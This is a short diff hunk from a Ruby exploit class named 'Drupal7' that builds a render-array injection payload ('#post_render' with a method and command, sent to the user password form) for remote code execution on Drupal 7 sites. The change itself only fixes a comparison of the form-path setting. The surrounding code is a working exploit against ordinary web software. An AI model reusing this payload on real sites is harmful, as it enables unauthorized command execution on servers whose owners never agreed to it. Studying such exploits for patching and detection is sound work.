@@ -91,7 +91,7 @@ class Drupal7 < Target
 
 		payload = URI.encode("name[#post_render][]=#{@method}&name[#markup]=#{@command}&name[#type]=markup")
 
-		if @form_path == 0 then
+		if @form_path == '0'
 			form = '/?q=user/password&'
 			form2 = '?q=file'
 		else
